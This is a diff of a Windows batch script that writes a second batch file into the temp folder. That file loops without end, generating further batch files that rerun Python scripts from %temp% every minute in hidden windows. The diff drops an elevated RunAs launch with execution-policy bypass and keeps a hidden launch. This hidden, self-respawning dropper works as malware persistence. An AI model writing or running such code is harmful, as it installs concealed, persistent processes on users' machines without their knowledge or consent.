@@ -1,8 +1,5 @@
 @echo off
 cd %temp%
-if exist "%temp%\nihbtdtdow.bat" ^(
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"
-^) else (
 echo @echo off > nihbtdtdow.bat
 echo cd %temp% >> nihbtdtdow.bat
 echo :loop >> nihbtdtdow.bat
@@ -64,11 +61,7 @@ echo echo    python3 %%temp%%\sh1.py ^>^> pro1.bat^ >> nihbtdtdow.bat
 echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro1.bat^ >> nihbtdtdow.bat
 echo echo    ) ^>^> pro1.bat^ >> nihbtdtdow.bat
 echo echo    goto loop ^>^> pro1.bat^ >> nihbtdtdow.bat
-
 echo powershell -c "Start-Process -FilePath "%%temp%%\pro1.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
-
-@REM -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 echo echo @echo off ^> pro.bat^ >> nihbtdtdow.bat
 echo echo del vb1.bat^ ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo :loop^ ^>^> pro.bat^ >> nihbtdtdow.bat
@@ -127,12 +120,9 @@ echo echo    python3 %%temp%%\sh.py ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro.bat^ >> nihbtdtdow.bat
 echo echo    ) ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    goto loop ^>^> pro.bat^ >> nihbtdtdow.bat
-
 echo powershell -c "Start-Process -FilePath "%%temp%%\pro.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
 echo timeout ^/t 900 ^/nobreak ^>nul >> nihbtdtdow.bat
 echo goto loop  >> nihbtdtdow.bat
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"
-
-^)
+powershell -c "Start-Process -FilePath "%temp%\nihbtdtdow.bat" -WindowStyle Hidden"
 
